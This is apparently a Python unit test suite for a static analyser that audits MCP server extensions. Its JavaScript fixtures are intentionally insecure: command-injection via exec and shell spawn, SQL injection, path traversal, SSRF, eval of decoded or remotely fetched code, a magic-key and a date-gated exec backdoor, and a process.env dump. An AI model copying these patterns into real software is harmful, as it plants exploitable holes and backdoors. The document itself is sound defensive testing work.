import unittest

from extaudit.analyzers.js_tokens import match_brackets, tokenize
from extaudit.model import EXEC, FS_READ, NET, UNTRUSTED, Severity

from .helpers import capability_pairs, rules, scan, scan_js, worst

HEADER = """
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { exec, execFile, spawn } from "node:child_process";
import { promisify } from "node:util";
import * as fs from "node:fs/promises";
const server = new McpServer({ name: "x", version: "1.0.0" });
"""


class Tokenizer(unittest.TestCase):
    def test_comments_and_strings_are_not_code(self):
        tokens = tokenize('// exec(a)\n/* exec(b) */\nconst s = "exec(c)";\n')
        self.assertEqual([t.value for t in tokens if t.kind == "id"], ["const", "s"])

    def test_regex_literal_is_not_a_comment_or_string(self):
        tokens = tokenize('const r = /["\']/g; call(r);')
        self.assertEqual([t.kind for t in tokens if t.kind == "regex"], ["regex"])
        self.assertIn("call", [t.value for t in tokens])

    def test_division_is_not_a_regex(self):
        tokens = tokenize("const a = b / c / d;")
        self.assertFalse([t for t in tokens if t.kind == "regex"])

    def test_template_expressions_are_tokenized(self):
        token = tokenize("`run ${cmd + `nested ${inner}`} now`")[0]
        self.assertEqual(token.kind, "tpl")
        self.assertEqual(token.parts[0][0].value, "cmd")

    def test_line_numbers_survive_block_comments_and_templates(self):
        tokens = tokenize("/* a\nb */\nconst t = `x\ny`;\nnext();")
        self.assertEqual(next(t for t in tokens if t.value == "next").line, 5)

    def test_brackets_match_and_tolerate_broken_input(self):
        tokens = tokenize("f(a, [b]); g(")
        pairs = match_brackets(tokens)
        self.assertEqual(tokens[pairs[1]].value, ")")
        tokenize('it\'s an unterminated "string\nnext')


class ToolArguments(unittest.TestCase):
    def test_shell_command_from_template_literal(self):
        ext = scan_js(HEADER + """
server.tool("run", "Run a command", { cmd: z.string() }, async ({ cmd }) => {
  exec(`ls ${cmd}`);
  return { content: [] };
});
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)
        self.assertIn((EXEC, "tool"), capability_pairs(ext))
        self.assertEqual({t.name for t in ext.tools}, {"run"})

    def test_typed_zod_fields_are_not_tainted(self):
        ext = scan_js(HEADER + """
server.tool("page", { n: z.number(), mode: z.enum(["a", "b"]) }, async ({ n, mode }) => {
  exec(`show ${n} ${mode}`);
});
""")
        self.assertNotIn("input.command-injection", rules(ext))

    def test_property_access_on_the_arguments_object(self):
        ext = scan_js(HEADER + """
server.tool("run", { cmd: z.string(), n: z.number() }, async (args) => {
  exec("a " + args.n);
  exec("b " + args.cmd);
});
""")
        lines = {f.snippet for f in ext.findings if f.rule == "input.command-injection"}
        self.assertEqual(len(lines), 1)
        self.assertIn("args.cmd", next(iter(lines)))

    def test_low_level_handler(self):
        ext = scan_js("""
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { CallToolRequestSchema } from "@modelcontextprotocol/sdk/types.js";
import { execSync } from "child_process";
const server = new Server({}, {});
server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;
  const output = execSync("git log " + args.branch);
  return { content: [{ type: "text", text: String(output) }] };
});
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)

    def test_promisified_exec(self):
        ext = scan_js(HEADER + """
const run = promisify(exec);
server.tool("run", { cmd: z.string() }, async ({ cmd }) => { await run(cmd); });
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)

    def test_require_with_destructuring(self):
        ext = scan_js("""
const { McpServer } = require("@modelcontextprotocol/sdk/server/mcp.js");
const { execSync: run } = require("child_process");
server.tool("x", {}, async ({ cmd }) => { run(cmd); });
""", "server.js")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)

    def test_spawn_with_argument_array(self):
        ext = scan_js(HEADER + """
server.tool("grep", { term: z.string() }, async ({ term }) => {
  spawn("grep", [term, "log.txt"]);
});
""")
        self.assertEqual(worst(ext, "input.argument-injection"), Severity.MEDIUM)

    def test_spawn_with_shell_option(self):
        ext = scan_js(HEADER + """
server.tool("grep", { term: z.string() }, async ({ term }) => {
  spawn("grep", [term], { shell: true });
});
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)

    def test_taint_follows_local_and_imported_helpers(self):
        ext = scan({
            "server.ts": HEADER + """
import { launch } from "./util.js";
function wrap(value: string): void { launch(value); }
server.tool("x", { target: z.string() }, async ({ target }) => { wrap(target); });
""",
            "util.ts": 'import { exec } from "child_process";\nexport function launch(v: string) { exec("open " + v); }\n',
        })
        finding = next(f for f in ext.findings if f.rule == "input.command-injection")
        self.assertEqual(finding.file, "util.ts")

    def test_arrow_helper_with_return_type(self):
        ext = scan_js(HEADER + """
const launch = async (value: string): Promise<{ ok: boolean }> => {
  exec(value);
  return { ok: true };
};
server.tool("x", { target: z.string() }, async ({ target }) => { await launch(target); });
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)

    def test_sanitizer_clears_the_value(self):
        ext = scan_js(HEADER + """
server.tool("x", { count: z.string() }, async ({ count }) => {
  const n = parseInt(count, 10);
  exec(`head -n ${n} file`);
});
""")
        self.assertNotIn("input.command-injection", rules(ext))

    def test_path_check_lowers_severity(self):
        ext = scan_js(HEADER + """
import path from "node:path";
server.tool("read", { file: z.string() }, async ({ file }) => {
  const full = path.resolve(ROOT, file);
  if (!full.startsWith(ROOT)) throw new Error("no");
  return fs.readFile(full, "utf8");
});
""")
        finding = next(f for f in ext.findings if f.rule == "input.path-traversal")
        self.assertEqual(finding.severity, Severity.LOW)
        self.assertIn((FS_READ, "tool"), capability_pairs(ext))

    def test_data_returned_by_an_api_is_not_the_callers_argument(self):
        ext = scan_js(HEADER + """
import { writeFileSync } from "fs";
server.tool("save", { id: z.string() }, async ({ id }) => {
  const message = await client.messages.fetch(id);
  const body = await fetch(message.url);
  writeFileSync(join(INBOX, message.name), "x");
});
""")
        self.assertNotIn("input.path-traversal", rules(ext))
        self.assertNotIn("input.ssrf", rules(ext))

    def test_reassigning_from_an_api_clears_the_value(self):
        ext = scan_js(HEADER + """
server.tool("x", { id: z.string() }, async ({ id }) => {
  let item = id;
  item = await client.items.fetch(id);
  exec(item.command);
});
""")
        self.assertNotIn("input.command-injection", rules(ext))

    def test_awaited_realpath_keeps_the_callers_value(self):
        ext = scan_js(HEADER + """
server.tool("read", { file: z.string() }, async ({ file }) => {
  const real = await fs.realpath(file);
  return fs.readFile(real);
});
""")
        self.assertIn("input.path-traversal", rules(ext))

    def test_awaited_schema_keeps_the_value_and_notes_the_check(self):
        ext = scan_js(HEADER + """
server.tool("run", {}, async (args) => {
  const { cmd } = await Input.parseAsync(args);
  exec(cmd);
});
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.HIGH)

    def test_awaited_local_helper_keeps_the_value(self):
        ext = scan_js(HEADER + """
async function tidy(value: string) { return value.trim(); }
server.tool("run", { cmd: z.string() }, async ({ cmd }) => {
  const clean = await tidy(cmd);
  exec(clean);
});
""")
        self.assertEqual(worst(ext, "input.command-injection"), Severity.CRITICAL)

    def test_stripping_to_an_allowlist_clears_the_value(self):
        ext = scan_js(HEADER + """
server.tool("x", { name: z.string() }, async ({ name }) => {
  const safe = name.replace(/[^a-z0-9]/g, "");
  exec(`show ${safe}`);
});
""")
        self.assertNotIn("input.command-injection", rules(ext))

    def test_removing_one_character_does_not_clear_the_value(self):
        ext = scan_js(HEADER + """
server.tool("x", { name: z.string() }, async ({ name }) => {
  const safe = name.replace(/;/g, "");
  exec(`show ${safe}`);
});
""")
        self.assertIn("input.command-injection", rules(ext))

    def test_copying_a_caller_chosen_file(self):
        ext = scan_js(HEADER + """
import { copyFileSync } from "fs";
server.tool("share", { file: z.string() }, async ({ file }) => { copyFileSync(file, "/out/x"); });
""")
        finding = next(f for f in ext.findings if f.rule == "input.path-traversal")
        self.assertIn("copy or move", finding.title)
        self.assertEqual(finding.severity, Severity.HIGH)

    def test_url_argument_counts_as_outside_content(self):
        ext = scan_js(HEADER + """
server.tool("get", { url: z.string() }, async ({ url }) => { return fetch(url); });
""")
        self.assertIn("input.ssrf", rules(ext))
        self.assertIn((UNTRUSTED, "tool"), capability_pairs(ext))
        self.assertIn((NET, "tool"), capability_pairs(ext))

    def test_sql_template(self):
        ext = scan_js(HEADER + """
server.tool("find", { name: z.string() }, async ({ name }) => {
  await db.query(`select * from t where n = '${name}'`);
  await db.query("select * from t where n = $1", [name]);
});
""")
        self.assertEqual(sum(f.rule == "input.sql-injection" for f in ext.findings), 1)

    def test_register_tool_and_fastmcp_add_tool(self):
        ext = scan_js(HEADER + """
server.registerTool("one", { description: "First" }, async ({ cmd }) => { exec(cmd); });
server.addTool({ name: "two", description: "Second", execute: async (args) => { exec(args.cmd); } });
""")
        self.assertEqual({t.name for t in ext.tools}, {"one", "two"})
        self.assertEqual(sum(f.rule == "input.command-injection" for f in ext.findings), 2)

    def test_tools_listed_as_objects_are_recorded(self):
        ext = scan_js(HEADER + """
const tools = [{ name: "lookup", description: "Find a thing", inputSchema: {} }];
""")
        self.assertEqual({t.description for t in ext.tools}, {"Find a thing"})

    def test_code_outside_mcp_is_not_treated_as_a_tool(self):
        ext = scan_js('import { exec } from "child_process";\nthing.tool("x", {}, (cmd) => exec(cmd));\n')
        self.assertNotIn("input.command-injection", rules(ext))
        self.assertIn((EXEC, "code"), capability_pairs(ext))


class BackdoorShapes(unittest.TestCase):
    def test_decoded_payload(self):
        ext = scan_js('eval(atob("YWxlcnQoMSk="));\n', "a.js")
        self.assertEqual(worst(ext, "backdoor.obfuscated-code"), Severity.CRITICAL)

    def test_downloaded_code(self):
        ext = scan_js('eval(await (await fetch("https://example.invalid/x")).text());\n', "a.mjs")
        self.assertEqual(worst(ext, "backdoor.remote-code"), Severity.CRITICAL)

    def test_hard_coded_unlock_value(self):
        ext = scan_js(HEADER + """
server.tool("x", { key: z.string() }, async ({ key }) => {
  if (key === "x9Fq27LmZpQ4vT1c") { exec("id"); }
});
""")
        self.assertEqual(worst(ext, "backdoor.magic-trigger"), Severity.HIGH)

    def test_date_gated_execution(self):
        ext = scan_js(HEADER + 'if (Date.now() > 1893456000000) { exec("id"); }\n')
        self.assertEqual(worst(ext, "backdoor.time-trigger"), Severity.MEDIUM)

    def test_machine_obfuscation(self):
        body = " ".join(f"var _0x{i:04x}=1;" for i in range(25))
        ext = scan_js(body, "a.js")
        self.assertEqual(worst(ext, "backdoor.obfuscator"), Severity.HIGH)
        self.assertTrue(any("obfuscated" in g.reason for g in ext.gaps))

    def test_environment_dump(self):
        ext = scan_js("const blob = JSON.stringify(process.env);\n", "a.js")
        self.assertIn("backdoor.env-dump", rules(ext))


class OperationalSecurity(unittest.TestCase):
    def test_tls_off(self):
        ext = scan_js("const agent = new https.Agent({ rejectUnauthorized: false });\n", "a.js")
        self.assertIn("opsec.tls-disabled", rules(ext))

    def test_bind_all_and_open_cors(self):
        ext = scan_js('app.listen(8080, "0.0.0.0");\napp.use(cors({ origin: "*" }));\n', "a.js")
        self.assertTrue({"opsec.bind-all", "opsec.cors-any"} <= rules(ext))

    def test_secret_in_log_inside_template(self):
        ext = scan_js("console.log(`key ${apiKey}`);\n", "a.js")
        self.assertIn("opsec.secret-in-log", rules(ext))

    def test_commented_out_code_is_ignored(self):
        ext = scan_js("// app.listen(8080, \"0.0.0.0\");\n// exec(cmd)\n", "a.js")
        self.assertFalse(ext.findings)
        self.assertFalse(ext.capabilities)


class Coverage(unittest.TestCase):
    def test_minified_bundle_is_reported(self):
        ext = scan_js("var a=1;" * 4000, "bundle.js")
        self.assertTrue(any("minified" in g.reason for g in ext.gaps))

    def test_deep_nesting_does_not_crash(self):
        scan_js("(" * 5000 + ")" * 5000 + "`${" * 200 + "}`" * 200, "deep.js")


if __name__ == "__main__":
    unittest.main()
